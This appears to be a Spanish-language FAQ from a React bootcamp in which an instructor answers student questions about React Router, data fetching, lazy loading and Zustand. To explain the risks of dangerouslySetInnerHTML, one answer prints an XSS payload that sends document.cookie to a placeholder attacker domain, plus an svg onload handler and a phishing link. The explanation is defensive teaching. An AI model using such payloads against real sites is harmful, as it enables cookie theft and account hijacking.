# Aquí puedes dejar tus dudas

## Primera parte

<!-- Dudas de la primera parte del ejercicio -->

### ¿Qué hace `<BrowserRouter>` por dentro para que funcionen los hooks?

Envuelvo la app con él y de repente `useNavigate`, `useParams` y `useSearchParams`
funcionan en componentes que están muy abajo, sin pasarles nada por props.
¿Cómo llega esa información hasta allí? Me han dicho que es "contexto", pero es
justo la parte que no entiendo.

**Respuesta:**
Exacto, Lo que hace es crear un `Provider` de un contexto de React. Lo que guarda adentro son dos cosas:

- la ubicación actual (`{ pathname, search, hash }`), que saca de `window.location`;
- una función para navegar, que por dentro usa `history.pushState` / `replaceState`.

Después, `useLocation`, `useNavigate` y `useSearchParams` son envoltorios: cada uno es un `useContext(...)` al mismo contexto. Y como es contexto, cualquier componente de adentro lo lee sin recibir props.

El detalle que te falta para cerrar el círculo: además de leerlo, el provider se suscribe al evento `popstate` del navegador. Cuando el usuario toca "atrás", el navegador avisa, el provider actualiza la ubicación del contexto y se repintan solo los componentes que la consumen.

### ¿Qué pasa si me olvido del `BrowserRouter`?

Probé a quitarlo y salta un error enorme. ¿Por qué no funciona sin más?

**Respuesta:**
Por la misma razón por la cual se rompe si queremos acceder a un estado que está fuera de un `Provider` en React.

El componente `BrowserRouter` lo que hace es ser el encargado y responsable de manejar el estado de los valores que usamos a nivel de navegación/rutas. Si queremos acceder a esa información, necesariamente debemos estar dentro de ese contexto.

### ¿Cuál es la diferencia entre `BrowserRouter` y `HashRouter`?

He visto los dos nombres. Uno pone `/search` y el otro `/#/search`.
¿Cuándo tendría que usar el segundo?

**Respuesta:**
Buena pregunta, lo tuve que buscar para poder responderlo:

Lo habitual en el 99% de los casos es usar `BroserRouter`. Cuando usamos `HashRouter`? Cuando desplegamos nuestro sitio a producción en hosting estáticos que no están preparados para las webs modernas con React/Vite (que no deberíamos hacerlo).

Para resumir y no entrar en demasiado detalle técnico, lo que sucede cuando entramos a una página `cualquiercosa.com/search` es hacer una llamada al `index.html` inicial y a partir de ahí navegar a nuestro HTML que está situado en `/search` por medio del Router. Es como querer acceder a `/search` -> lee el código de `/` -> navega a `/search` con la información de esa página (no es precisamente así pero para que nos hagamos una idea).

Es un comportamiento de Vite, y hay histing como Github Pages que no lo hacen así, vos solicitas acceder a `/search` y te lleva a un `404` porque no hace todo ese mapeo hasta llegar a `/search`. Para eso existe `HashRouter`.

Hay que usarlo? No, siempre usa BrowserRouter y desplega en lugares en donde esté normalizado el desplegar aplicaciones de React y/o Vite.

### ¿Por qué modificamos el `Link` por dentro en vez de cambiar todos los `<Link>` de la app?

El enunciado insiste mucho en esto. Entiendo que hay menos cambios, pero ¿es solo
por comodidad o hay alguna razón más de fondo?

**Respuesta:**
Por comodidad sí, pero sobre todo por diseño:
Queremos unificar un componente universal en un solo sitio, y para que no haya 1000 Links diferentes en nuestro sitio que a cada mínimo cambio se necesite recorrer todos ellos, usamos este diseño de unicidad.

### ¿Por qué React Router usa `to` y no `href`?

Nuestro componente recibe `href` y por dentro lo traduce a `to`. ¿Por qué no usaron
`href` directamente, si al final se pinta un `<a>`?

**Respuesta:**
Porque `to` no es lo mismo que un `href`: `to` acepta un string **o un objeto**, y a nivel de diseño cuando crearon React Router se plantearon esto y decisieron ponerlo con otro nombre para diferenciar.

### Después de cambiar `useRouter`, ¿por qué no hubo que tocar nada más?

Esto me sorprendió mucho: he cambiado el hook entero por dentro y el resto de la app
sigue funcionando igual. ¿Eso es lo que llaman "encapsulación"?

**Respuesta:**
Exacto, y sobre todo porque usamos el mismo contrato. La idea de haberlo hecho como lo hicimos es que podamos tener un código mantenible y con pocos cambios independientemente de la librería que usemos.

### ¿Puedo borrar `Route.jsx` sin miedo?

Lo hemos borrado porque React Router ya trae su propio `Route`. Pero, ¿cómo sé con
seguridad que un archivo ya no lo usa nadie? ¿Solo buscando con Ctrl+F?

**Respuesta:**
Si, normalmente si es un archivo que ya no se usa, al hacer un `npm run build` no debería de romperse nada, si se rompe seguramente es porque había un archivo que hacía uso de ese componente.

## Segunda parte

<!-- Dudas de la segunda parte del ejercicio -->

### ¿Qué significan los dos puntos en `/job/:id`?

Entiendo que es "aquí va algo variable", pero ¿cómo sabe React Router dónde termina
ese trozo? ¿Y si el id tuviera una barra dentro?

**Respuesta:**
Muy buena la segunda pregunta, porque ahí está lo importante. React Router hace un regex interno para identifciar la variable y se corta en el primer `/` siguiente que ve. Así es como funciona.

### ¿`useParams` me devuelve siempre texto?

Si la URL fuera `/job/42`, ¿me llega el número 42 o el texto `"42"`? Porque en el
ejercicio 2 me pasó algo parecido con los filtros y me dio problemas.

**Respuesta:**
Siempre te lo va a devolver como texto, pasa lo mismo si escribís `/job/undefined`, no va a llegar como undefined sino como "undefined" (texto).

### ¿Por qué el fetch va dentro de un `useEffect` y no directamente en el componente?

Probé a hacer el fetch a pelo dentro de la función del componente y la página se
quedó pidiendo datos sin parar. ¿Por qué pasa eso?

**Respuesta:**
Bucle infinito, si haces un fetch en el cuerpo del componente con un `setState`, lo que estas probocando es que en cada cambio de estado (respuesta del fetch) se re vuelva a renderizar el componente y haga nuevamente el fetch con el `setState`.

Por eso cuando queremos controlar eventos externos es importante dejarlos en un `useEffect`, para que sean independientes de los `setState`.

### ¿Qué es `AbortController` y de verdad hace falta?

Sin él parece que todo funciona. El comentario dice que es para cuando el usuario
cambia de empleo muy rápido. ¿Es un problema que pasa de verdad o es una precaución
de manual?

**Respuesta:**
Es la forma estándar de cancelar peticiones. Le pasás `signal` al `fetch` y cuando llamás `controller.abort()` la promesa se rechaza con un error de nombre `AbortError`.

¿Pasa de verdad? Sí, dos casos concretos en tu propio código:

1. Entrás a un empleo, te arrepentís y volvés. Sin abort, la respuesta sigue viajando; si llega después, escribe estado de una pantalla que ya no existe.
2. Cambiás de empleo rápido: la respuesta vieja puede llegar después de la nueva y pisar los datos buenos. Eso se llama *race condition* y es de los bugs más difíciles de reproducir a mano.

Hace falta usarlo si y sobre todo en peticiones que tienen una demora significativa, propensas a cambios de decisión por parte del usuario.

### ¿Por qué no puedo poner `async` directamente en el `useEffect`?

Tengo que declarar una función async dentro y llamarla justo después, lo cual parece
una vuelta innecesaria. ¿Por qué React no lo permite?

**Respuesta:**
Buena pregunta, el truco está en el tipo de retorno del useEffect. React espera que el efecto devuelva **o nada, o una función de limpieza**. Una función `async` devuelve siempre una promesa, así que React recibe una promesa donde esperaba una función.

De ahí el patrón que ya usás: declarar la función `async` adentro y llamarla justo después. La función del efecto sigue siendo síncrona y puede devolver `return () => controller.abort()`.

La alternativa es `useEffect(() => { (async () => {...})() }, [])`, pero no la recomiendo: queda más ilegible sin ganar nada.

### ¿Qué es Markdown y por qué la API me lo manda así?

Me llega texto con guiones y asteriscos. ¿Por qué el servidor no me lo manda ya en
HTML y me ahorro la librería?

**Respuesta:**
La API lo manda así en vez de HTML por tres razones:

- **Separación de responsabilidades**: el servidor guarda contenido, no presentación. Si mañana el diseño cambia, no hay que reprocesar los datos.
- **Seguridad**: devolver HTML crudo desde el servidor es regalarle a quien controle ese contenido la posibilidad de inyectar etiquetas y scripts. El Markdown es un subconjunto bastante más chico y predecible.
- **Portabilidad**: el mismo texto se puede convertir a HTML, a un PDF, o a una app mobile sin tocar el backend.

El costo es que el cliente tiene que convertirlo: por eso entra `snarkdown` (pesa menos de 1KB, y con `lazy()` ni siquiera viaja hasta que entrás a la página de detalle).

### `dangerouslySetInnerHTML` — ¿qué es exactamente lo peligroso?

El nombre asusta bastante. ¿Qué podría pasar en el peor de los casos? ¿Y cómo sé
cuándo puedo fiarme de un contenido y cuándo no?

**Respuesta:**
Lo peligroso, con ejemplos concretos de `<img src=x onerror="...">`:

- `<img src="x" onerror="fetch('https://malo.tk?c='+document.cookie)">` -> el handler se ejecuta apenas falla la imagen.
- `<svg onload="...">` -> igual, y el `<svg>` sí ejecuta handlers inline.
- `<a href="https://una-copia-falsa.tk">Iniciar sesión</a>` -> phishing dentro de tu propio sitio.

Un `<script>` insertado por `innerHTML` **no** se ejecuta (el HTML5 lo prohíbe), pero los atributos de evento (`onerror`, `onload`) sí. Por eso mucha gente cree que está a salvo y no lo está.

¿Cuándo te podés fiar? Cuando el contenido lo producís vos y no lo edita nadie de afuera: acá es la API del bootcamp, con datos del curso, por lo que no hay problema. Pero hay que usarlo con mucha precausión.

### ¿Por qué el `<Link>` envuelve solo el título y no toda la tarjeta?

Si envuelvo toda la tarjeta queda más bonito de pulsar, pero el comentario dice que
entonces el botón "Aplicar" también navegaría. ¿Por qué? ¿Un click dentro de un
enlace "cuenta" como click en el enlace?

**Respuesta:**
Porque el click hace **bubbling**: si el `<a>` rodea toda la tarjeta, un click en "Aplicar" también pasa por el `<a>`, el navegador sigue el enlace y te vas al detalle sin querer.

Hay dos cosas más de fondo:

- En HTML, un `<button>` adentro de un `<a>` es contenido interactivo anidado: inválido según la especificación, y el comportamiento depende del navegador.
- Y aunque lo pusieras, ya tenés que pelear con el foco: dos controles superpuestos generan un tab extra que el usuario no espera.

Por eso la solución correcta es la que elegiste: el `<Link>` abraza el título, y el botón queda afuera, hermano. Es más trabajo de CSS para que se sienta "tarjeta clickeable", pero es la que se comporta bien con teclado y lectores de pantalla.

## Tercera parte

<!-- Dudas de la tercera parte del ejercicio -->

### ¿Por qué es mejor guardar los filtros en la URL que en un `useState`?

En el ejercicio anterior usaba `useState` y funcionaba. Ahora todo está en la URL.
Entiendo que así se puede compartir el enlace, pero ¿no es más complicado?

**Respuesta:**
Es un poco más de código pero tiene muchas ventajas:
- recargar mantiene la búsqueda
- "atrás"/"adelante" funcionan como uno espera
- el enlace se puede compartir
- podés abrir dos búsquedas en dos pestañas sin que se pisen

### ¿`useSearchParams` es igual que `useState`?

Se parecen mucho (devuelve el valor y un setter), pero uno guarda en la URL y el
otro en memoria. ¿Puedo pensar en ellos como lo mismo o hay diferencias que me van
a morder luego?

**Respuesta:**
Son parecidos a la hora de escribirse pero hay diferencias:
`useState` es estado de tu componente; `useSearchParams` es estado del navegador que tu componente lee.

Cada uno con su responsabilidad bien marcada.

### ¿Por qué hay que hacer una COPIA de `searchParams` antes de modificarlo?

En el código se hace `new URLSearchParams(paramsActuales)`. Si ya tengo el objeto,
¿por qué no lo modifico y ya está? ¿Qué pasaría si lo hiciera?

**Respuesta:**
Porque si modificás el que te dio React, para React el valor es el mismo objeto (`===`) que antes, así que puede decidir que nada cambió y no renderizar.

### ¿Qué es `{ replace: true }` y por qué se usa aquí?

Entiendo que tiene que ver con el botón "atrás" del navegador, pero no acabo de
imaginarme la diferencia. ¿Cómo lo pruebo para verlo?

**Respuesta:**
El historial tiene dos formas de anotar: **push** (agrega una entrada nueva) y **replace** (pisa la entrada actual). Por defecto todo es push, que es lo que querés en un click de navegación: "atrás" te devuelve al lugar anterior.

Acá el problema es que el buscador actualiza la URL cada 400ms mientras escribís. Con push, la palabra "react" te dejaría cinco entradas en el historial y el botón "atrás" del usuario no volvería a la página anterior: iría borrando letras. Con `replace`, se pisa la entrada actual y tu historial queda limpio.

Para verlo podes abrí DevTools, cambiá filtros, y mirá la lista del historial (o mantené apretado "atrás"). Probá sacando `{ replace: true }` y comparás.

### ¿Por qué las dependencias del `useEffect` son `text, technology, type, level` y no `searchParams`?

El comentario dice que `searchParams` es un objeto nuevo cada vez y que React los
compara con `===`. ¿Eso significa que dos objetos con el mismo contenido no son
"iguales" para JavaScript? Eso me parece rarísimo.

**Respuesta:**
Porque React compara las dependencias con `Object.is`, que para objetos es comparar la referencia (`===`). `searchParams` es un objeto nuevo en cada render: si lo pusieras en el array, el efecto se dispararía en cada render y tendrías un loop de fetch.

Los strings se comparan por valor: `'react' === 'react'` es `true`, así que el efecto solo se repite cuando el texto realmente cambia. Esa es toda la diferencia.

Sobre tu otra pregunta: sí, dos objetos con el mismo contenido son distintos para JavaScript. `{} === {}` da `false`, porque cada `{}` es un objeto nuevo en memoria. Es la misma raíz que la duda de `.push()` en Zustand.

### Los filtros se guardan como `type` en la URL pero el select se llama `location`, ¿por qué?

Me lié bastante con los nombres. ¿Es porque la API los llama así? ¿Está bien tener
nombres distintos para lo mismo según la capa?

**Respuesta:**
Está bien que los nombres no coincidan siempre que sepas en qué frontera cambia el nombre. Lo que está mal es que el nombre raro se te escape a toda la app: por eso el mapeo vive en `SearchFormSection` (y en `Search` al armar la query), en dos lugares bien acotados.

## Cuarta parte

<!-- Dudas de la cuarta parte del ejercicio -->

### ¿Qué significa que el código se "descargue por trozos"?

Entiendo la idea general (no bajar lo que no uso), pero no sé qué está pasando
técnicamente. ¿Se hacen más peticiones al servidor? ¿Cuándo exactamente?

**Respuesta:**
Cuando el bundler arma el build, agrupa el código en archivos. Con `import` estático todo cae en el mismo paquete principal; con `import()` dinámico (que es lo que usa `lazy()` por dentro) genera **un archivo aparte por cada import dinámico**.

En runtime pasa esto: entrás a la home, el navegador descarga el paquete principal; clickeás "Empleos" por primera vez, el navegador pide `Search-xxxx.js` recién ahí, lo ejecuta y recién entonces React puede pintar la página. De ahí el `<Suspense fallback>`: mientras el chunk viaja, tiene que haber algo en pantalla.

Si vas al apartado de Network en las DevTools lo vas a poder ver bien.

### ¿Qué es la pestaña Coverage de las DevTools y cómo la leo?

El enunciado dice que mire ahí, pero al abrirla veo un montón de barras rojas y
verdes y no sé qué significan.

**Respuesta:**
Bien, este panel tiene varias cosas pero lo importante es que funciona para medir. Para lo que se descargó en la sesión, cuántos bytes se **ejecutaron** y cuántos quedaron sin usar. La barra roja es lo cargado y no usado; la azul/verde, lo que sí se usa.

Comparás el antes (todo en un archivo con rojo en `Detail`, `Search`, `404`) con el después (`Detail-xxx.js` no aparece hasta que entrás al detalle).

### ¿Por qué `lazy()` necesita esa vuelta con `.then()`?

```js
lazy(() => import('./pages/Home.jsx').then((m) => ({ default: m.HomePage })))
```

Esta línea es horrible de leer. ¿No hay una forma más simple? ¿Y por qué exige un
`export default`?

**Respuesta:**
Porque `lazy()` exige que el módulo tenga **`export default`**, y tus páginas usan export nombrado (`export function HomePage`).

`import()` no devuelve el componente: devuelve el objeto del módulo, o sea `{ HomePage }`.
`.then((modulo) => ({ default: modulo.HomePage }))` es simplemente "envolver mi export nombrado en la forma que `lazy` espera".

Exige default porque `lazy` no tiene cómo adivinar cuál de los exports es el componente si hay varios, y el default es la convención de React para "el componente de este archivo". Por eso `App.jsx` sí es default: es el único componente de su archivo.

`lazy` recibe una **función** que devuelve la promesa, no la promesa (si le pasás la promesa ya ejecutada, el chunk se descarga al arrancar y perdés la ventaja).

### ¿Qué pasa si me olvido del `<Suspense>`?

¿Da error o simplemente se ve mal un momento?

**Respuesta:**
Cuando `lazy` necesita el chunk y no encuentra un `<Suspense>` arriba, el error sube hasta el `ErrorBoundary` más cercano; si no hay ninguno (como en este proyecto), React desmonta el árbol y te queda la pantalla en blanco con un error en consola.

Así que todo `lazy` necesita un `<Suspense>` por encima. En `App.jsx` hay uno solo envolviendo todas las rutas.

### ¿El `fallback` se ve siempre o solo la primera vez?

Porque cuando navego entre páginas apenas veo el "Cargando...". ¿Se queda guardado
el trozo descargado?

**Respuesta:**
Solo la primera vez que se pide cada chunk. Después el módulo queda en la caché interna de módulos del navegador, así que la próxima vez que navegues a esa página React la resuelve al instante, sin pasar por el fallback.

Por eso cuando ibas y venías entre páginas casi no veías el "Cargando...". En dev lo vas a ver más seguido porque Vite revalida módulos.

### ¿Merece la pena hacer lazy loading en una app tan pequeña?

Con 4 páginas, ¿no estoy complicando el código para ganar unos milisegundos?
¿A partir de qué tamaño empieza a compensar?

**Respuesta:**
Si, para cuatro páginas chicas, el beneficio es casi simbólico. Lo hicimos para que tengan presente como hacerlo, es útil en proyectos grandes.

## Quinta parte

<!-- Dudas de la quinta parte del ejercicio -->

### ¿Qué diferencia hay entre `Link` y `NavLink`?

Los dos navegan igual. Entiendo que `NavLink` "sabe si está activo", pero
¿cómo lo sabe? ¿Compara la URL solo?

**Respuesta:**
`NavLink` es `Link` más una cosa: sabe si su destino coincide con la ruta actual. Por dentro usa la ubicación del contexto y el path resuelto de su `to`, y te pasa `isActive` (y `isPending`) a `className`, `style` o `children` si los escribís como función.

Además, cuando está activo, `NavLink` agrega solo `aria-current="page"`. Eso es importante: la diferencia visual y la diferencia para el lector de pantalla salen del mismo cálculo, así que no se pueden desincronizar.

Lo que hace es compara el `pathname` actual con su `to` resuelto.

### ¿Por qué `className` puede ser una función en `NavLink`?

En todos los demás sitios `className` es un texto. Aquí le paso una función y React
no se queja. ¿Eso es cosa de React o de React Router?

**Respuesta:**
Porque en React `className` es solo una prop con un nombre que React conoce: puede recibir cualquier expresión, en este caso una función. Lo que hace la magia es `NavLink`, que la llama:

```js
// por dentro, más o menos
const clases = typeof className === 'function'
  ? className({ isActive, isPending })
  : className
```

En definitiva es una decisión de diseño de React Router.

### ¿Para qué sirve la prop `end` del `NavLink`?

Sin ella, el enlace de "Inicio" se me marcaba como activo estando en `/search`.
No entiendo por qué React Router considera que `/search` "empieza por" `/`.

**Respuesta:**
Se considera activo si la ruta actual **empieza** con el `to`. Y toda ruta empieza con `/`. Entonces `<NavLink to="/">` sin `end` está activo en `/`, en `/search` y en `/job/123` siempre.

`end` le dice "tiene que coincidir hasta el final, no alcanza con el prefijo". Lo necesitás en el link de la raíz y, en general, en cualquier link cuyo destino sea padre de otros (`to="/search"` sin `end` se marcaría activo también en `/search/algo`).

### ¿Cómo sé si un botón necesita estado local o estado global?

Esta es mi duda más grande del ejercicio. ¿Por qué "¿he aplicado?" es local y
"¿he iniciado sesión?" es global? Los dos son booleanos que cambian al pulsar un botón.

**Respuesta:**
No hay una regla pero hay señales.

**Local (`useState`) si:**

- solo lo usa ese componente o su padre inmediato
- es efímero y no tiene sentido que sobreviva a una navegación (un modal abierto, el texto de un input)
- nadie más necesita reaccionar cuando cambia

**Global (`Zustand`) si:**

- dos componentes lejanos tienen que estar de acuerdo (el botón de login del `Header` y el "Aplicar" de `JobCard`)
- es estado de dominio, no de pantalla: sesión, favoritos, carrito
- tiene que sobrevivir a navegar entre páginas

## Sexta parte

<!-- Dudas de la sexta parte del ejercicio -->

### ¿Qué problema resuelve Zustand exactamente?

Entiendo lo del "prop drilling", pero ¿es tan grave pasar una prop por tres
componentes? ¿A partir de cuántos niveles deja de merecer la pena?

**Respuesta:**
Dos, y conviene separarlos.

**El prop drilling**: el botón de login está en `Header` y el de aplicar en `JobCard`, que están en ramas distintas del árbol. Con `useState` habría que subir el estado a `App` y bajarlo por props a través de componentes que no lo usan. Y cuando el árbol es profundo eso se vuelve insostenible y cualquier refactor te obliga a tocar cinco archivos.

**El re-render**: el estado de un store vive afuera de React y cada componente se suscribe a un pedazo. Cambia `isLoggedIn` y se repintan `Header` y `JobCard`, no la lista de empleos entera.

### ¿Dónde vive el estado de Zustand si no está dentro de React?

Esto me descoloca: el store se crea fuera de cualquier componente, en un archivo
suelto. ¿Cómo se entera React de que ha cambiado algo?

**Respuesta:**
Buenisima pregunta, vamos con un término nuevo: En una **closure de JavaScript**. `create()` devuelve un objeto (el store) con tres cosas: `getState`, `setState` y `subscribe`. Ese objeto vive en el ámbito del módulo, o sea en memoria del navegador, al lado de tu código, no adentro de un componente.

Lo que hace que React se entere es el hook: `useAlgoStore(selector)` usa `useSyncExternalStore` por dentro. Funciona así:

1. al montar, se suscribe con `store.subscribe(...)`
2. en cada render, lee el snapshot con el selector
3. cuando el store avisa que cambió, React vuelve a leer y decide si repintar.

Esto explica también por qué el estado se pierde al recargar: es una variable en memoria, y al recargar la página se ejecuta tu JS de cero.

Esto fue medio complejo pero te lo quiero dejar explicado para que al menos tengas una idea de cômo funciona y para donde explorar.

### ¿Por qué se pasa un "selector" como `useAuthStore((state) => state.isLoggedIn)`?

¿Qué pasaría si escribo `useAuthStore()` a secas? El comentario dice que el
componente se repintaría de más, pero no entiendo cómo el selector lo evita.

**Respuesta:**
Porque el selector es lo que le dice a Zustand qué mirar, y sin él el componente se suscribe al estado entero.

Con `useAuthStore()` a secas, el valor que devuelve es el objeto completo y Zustand lo compara por referencia: cualquier `set()` (aunque sea de una acción que no usás) crea un estado nuevo, la referencia cambia y tu componente se repinta. Con el selector devolvés un boolean y Zustand compara booleanos con `Object.is`: si sigue siendo `false`, no hay render.

### ¿Por qué NO puedo usar el helper `isFavorite()` de la store dentro del componente?

Esta me parece la trampa más sutil de todo el ejercicio. El helper existe, lo llamo,
me devuelve el valor correcto... y aun así el botón no se actualiza. ¿Por qué leer
con `get()` no "suscribe" al componente?

**Respuesta:**
Porque el helper no es un hook: lee con `get()` y listo. Devuelve el valor correcto en ese instante, pero **no suscribe** al componente. Nunca se queda escuchando, así que cuando `favorites` cambia no hay nadie que le avise a React.

El patrón que usaste es el bueno:

```js
const isFavorite = useFavoritesStore((state) => state.favorites.includes(job.id))
```

Ahí el cálculo ocurre **dentro del selector**. Zustand lo evalúa con el estado actual, devuelve un boolean y compara con el anterior: cuando el `includes` pasa de `false` a `true`, cambia el valor seleccionado y se repinta.

### ¿Por qué no se puede usar `.push()` para añadir un favorito?

Entiendo que hay que crear un array nuevo con `[...state.favorites, jobId]`, pero
no me entra en la cabeza. Si el array tiene los mismos elementos al final,
¿qué más da cómo lo haya metido?

**Respuesta:**
Porque `push` muta el array existente y devuelve la misma referencia. Para React (y para Zustand) "el mismo array" significa "no cambió nada": no repinta, y el botón se queda mostrando lo de antes.

### ¿Qué significa que React "compara por referencia"?

Creo que esta es la raíz de la duda anterior. Puede haber dos arrays idénticos que
para JavaScript sean distintos? Y dos distintos que sean "iguales"?

**Respuesta:**
Que para decidir si algo cambió compara con `Object.is`, que en objetos y arrays es comparar la dirección en memoria (`===`). No mira el contenido.

Entonces, respondiendo a tus dos preguntas:

- dos arrays **idénticos en contenido** son distintos (`[1] === [1]` es `false`), así que React repinta;
- dos referencias al **mismo array** son iguales (`a === a` es `true`) aunque le hayas hecho `push`, así que React no repinta.

### ¿Se pierde el estado de Zustand al recargar la página?

Porque si inicio sesión y pulso F5, vuelvo a estar desconectado. ¿Eso es normal?
¿Cómo lo hacen las webs reales para acordarse de ti?

**Respuesta:**
Sí, y es lo esperado: vive en memoria, y recargar reinicia tu JS.

Si querés que sobreviva, Zustand trae el middleware `persist`:

```js
import { persist } from 'zustand/middleware'

export const useAuthStore = create(
  persist(
    (set) => ({ isLoggedIn: false, login: () => set({ isLoggedIn: true }), logout: () => set({ isLoggedIn: false }) }),
    { name: 'auth' }              // clave en localStorage
    // partialize: (s) => ({ isLoggedIn: s.isLoggedIn })  <- para no guardar acciones
  )
)
```

En productos reales usamos cookies para sesión, pero eso es un tema de más adelante.

### ¿Qué ventaja tiene Zustand frente al Context de React?

Los dos parecen servir para lo mismo. ¿Por qué el bootcamp nos enseña Zustand?

**Respuesta:**
Con Context:
- tenés que montar providers y anidarlos
- el valor solo existe adentro de React.

Con Zustand:
- no hay providers: el store es un import
- podés leer y escribir el estado desde afuera (tests, acciones, listeners)
- trae middleware (persist, devtools, immer) y `useShallow` para casos límite.
